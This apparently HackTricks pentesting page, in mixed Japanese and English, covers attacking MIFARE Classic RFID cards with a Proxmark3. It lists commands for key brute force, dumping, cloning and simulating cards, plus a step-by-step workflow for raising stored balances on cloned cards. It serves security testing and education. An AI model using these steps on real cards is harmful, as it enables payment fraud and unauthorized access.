# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 を使った RFID システムの攻撃

The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB への攻撃

それは **16セクタ** を持ち、各セクタは **4ブロック**、各ブロックは **16B** を含みます。UIDはセクタ0ブロック0にあり（変更できません）。\
各セクタにアクセスするには、各セクタの **ブロック3**（sector trailer）に格納されている **2つのキー**（**A** と **B**）が必要です。セクタトレーラは、2つのキーを使って **各ブロック** に対する **読み取り** と **書き込み** 権限を与える **アクセスビット** も格納しています。\
2つのキーは、たとえば最初のキーが分かれば読み取り、二番目のキーが分かれば書き込みを許可するといった用途に便利です。

いくつかの攻撃が実行できます。
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **cryptographic operations used are weak** and knowing the plain and cipher text you can calculate it (`mfkey64` tool).

#### MiFare Classic quick workflow for stored-value abuse

When terminals store balances on Classic cards, a typical end-to-end flow is:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
注意

- `hf mf autopwn` は nested/darkside/HardNested-style 攻撃をオーケストレーションし、鍵を回復し、クライアントの dumps フォルダにダンプを作成します。
- ブロック0/UID の書き込みは magic gen1a/gen2 カードでのみ動作します。通常の Classic カードでは UID は読み取り専用です。
- 多くの導入では Classic の「value blocks」や単純なチェックサムが使われています。編集後は、複製・補完されたフィールドやチェックサムが一貫していることを確認してください。

より上位の手法や緩和策については、次を参照してください：

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw コマンド

IoTシステムでは、**非ブランドまたは非商用のタグ**を使用することがあります。その場合、Proxmark3 を使ってタグにカスタムの **生のコマンド** を送信できます。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
この情報を使って、カードやカードと通信する方法について調べてみてください。Proxmark3 は次のような raw コマンドを送信できます: `hf 14a raw -p -b 7 26`

### スクリプト

Proxmark3 ソフトウェアには、簡単なタスクを実行するために使える **自動化スクリプト** がプリロードされています。完全な一覧を取得するには `script list` コマンドを使用してください。次に `script run` コマンドを使用し、続けてスクリプト名を指定します:
```
proxmark3> script run mfkeys
```
スクリプトを作成して **fuzz tag readers** を行うことができます。つまり、**valid card** のデータをコピーし、**Lua script** を書いて、1つ以上のランダムな **bytes** を **randomize** し、任意の反復で **reader crashes** するかを確認します。

## 参考

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
